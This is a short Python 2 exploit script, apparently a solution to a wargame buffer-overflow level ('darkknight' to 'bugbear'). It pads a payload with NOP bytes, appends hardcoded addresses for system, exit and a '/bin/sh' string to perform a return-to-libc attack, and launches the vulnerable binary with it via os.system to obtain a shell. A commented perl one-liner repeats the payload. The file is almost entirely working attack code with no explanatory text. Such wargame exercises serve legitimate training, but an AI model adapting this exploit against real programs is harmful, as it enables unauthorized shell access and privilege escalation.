import os, sys

print "Bugbear Exploit by Phantom"
print "[+] Making Exploit......"

victim = "/home/darkknight/bugbear"
NOP = "\x90"*44
system = "\xe0\x8a\x05\x40"
exit = "\xe0\x91\x03\x40"
binsh = "\xf9\xbf\x0f\x40"

payload = NOP + system + exit + binsh

print "[+] Victim : " + victim
print "[+] Exploiting Bugbear RTL vuln.."
print "[+] Loading payload..."
print "[+] Shellcode length : ", len(payload)
print

os.system(victim + " " + payload)
#./bugbear $(perl -e 'print "\xbf"x44, "\xe0\x8a\x05\x40", "cccc", "\xf9\xbf\x0f\x40"')